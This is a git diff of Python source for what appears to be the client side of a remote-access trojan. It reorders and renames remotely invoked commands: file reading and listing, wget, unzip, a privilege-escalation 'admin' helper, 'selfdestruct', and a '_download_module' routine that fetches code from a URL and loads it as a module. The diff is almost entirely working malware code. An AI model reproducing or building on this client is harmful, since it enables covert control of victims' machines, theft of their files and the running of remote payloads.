@@ -21,7 +21,7 @@
 # OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 # SOFTWARE.
 
-''' 
+'''  
 
 ,adPPYYba, 8b,dPPYba,   ,adPPYb,d8 88,dPPYba,  aa       aa
 ""     `Y8 88P'   `"8a a8"    `Y88 88P'   `"8a 88       88
@@ -85,16 +85,15 @@ class Client(object):
     __command__ = {}
     __modules__ = {}
     def __init__(self, *args, **kwargs):
-        [setattr(self, chr(i), kwargs.get(chr(i))) for i in range(97,123) if chr(i) in kwargs]
-        time.clock()
-        self.mode       = 0
-        self.exit       = 0
-        self.threads    = {}
-        self.cmds       = __command__
-        self.mods       = __modules__
+        self.none       = [setattr(self, chr(i), kwargs.get(chr(i))) for i in range(97,123) if chr(i) in kwargs]
+        self.cmds       = {cmd: getattr(self, cmd) for cmd in __command__}
+        self.mods       = {mod: getattr(self, mod) for mod in __modules__}
         self.info       = self._info()
         self.logger     = self._logger()
         self.result     = self._result()
+        self.mode       = 0
+        self.exit       = 0
+        self.threads    = {}
 
 # ----------------- PRIVATE FUNCTIONS --------------------------
 
@@ -282,7 +281,7 @@ class Client(object):
                     return ip
             except: pass
 
-    def _get_admin(self):
+    def _admin(self):
         info = self.info()
         if info['Admin']:
             return {'User': info['login'], 'Administrator': info['admin']}
@@ -292,7 +291,7 @@ class Client(object):
             else:
                 return "Privilege escalation on platform: '{}' is not yet available".format(sys.platform)
 
-    def _create_module_from_url(self, uri, name=None):
+    def _download_module(self, uri, name=None):
         name    = os.path.splitext(os.path.basename(uri))[0] if not name else name
         module  = new_module(name)
         source  = request('GET', uri).content
@@ -876,22 +875,10 @@ class Client(object):
                 print "Error: '{}'".format(str(e))
 
     @command
-    def cd(self, pathname): return os.chdir(pathname) if os.path.isdir(pathname) else os.chdir('.')
-    
-    @command
     def pwd(self): return os.getcwd()
 
     @command
-    def wget(self, target): return urlretrieve(target)[0]
-    
-    @command
-    def cat(self,filename): return open(filename).read(4000) 
-
-    @command
-    def ls(self, path='.'): return '\n'.join(os.listdir(path))
-
-    @command
-    def unzip(self, fname): return ZipFile(fname).extractall('.')
+    def admin(self): return self._admin()
 
     @command
     def run(self): return self.run_modules()
@@ -915,16 +902,31 @@ class Client(object):
     def selfdestruct(self): return self.self_destruct()
 
     @command
+    def wget(self, target): return urlretrieve(target)[0]
+    
+    @command
+    def cat(self,filename): return open(filename).read(4000) 
+
+    @command
+    def download(self,url): return self._download_module(url)
+
+    @command
+    def ls(self, path='.'): return '\n'.join(os.listdir(path))
+
+    @command
+    def unzip(self, fname): return ZipFile(fname).extractall('.')
+
+    @command
     def modules(self): return '\n'.join([mod for mod in self.mods])
 
     @command
     def commands(self): return '\n'.join([cmd for cmd in self.cmds])
 
     @command
-    def download(self,url): return self._create_module_from_url(url)
+    def options(self,*arg): return self._options(arg[0]) if arg else self._options()
 
     @command
-    def options(self,*arg): return self._options(arg[0]) if arg else self._options()
+    def cd(self, pathname): return os.chdir(pathname) if os.path.isdir(pathname) else os.chdir('.')
 
     @command
     def get(self, target): return getattr(self, target)() if target in ('jobs','results','options','status','commands','modules','info') else '\n'.join(["usage: {:>16}".format("'get <option>'"), "options: {}".format("'jobs','results','options','status','commands','modules','info'")]) 
